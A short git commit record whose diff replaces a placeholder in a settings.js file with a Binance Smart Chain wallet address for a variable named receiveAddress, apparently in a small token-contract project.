de867cec0f50471fa30e50a85d3345c98588243c
LINDZELUNA <107088587+LINDZELUNA@users.noreply.github.com>
2022-06-08 03:15:46 -0500

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xB88C350e2Ecce2b74F6Dd21C62D18ac1aFA5D9BD";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
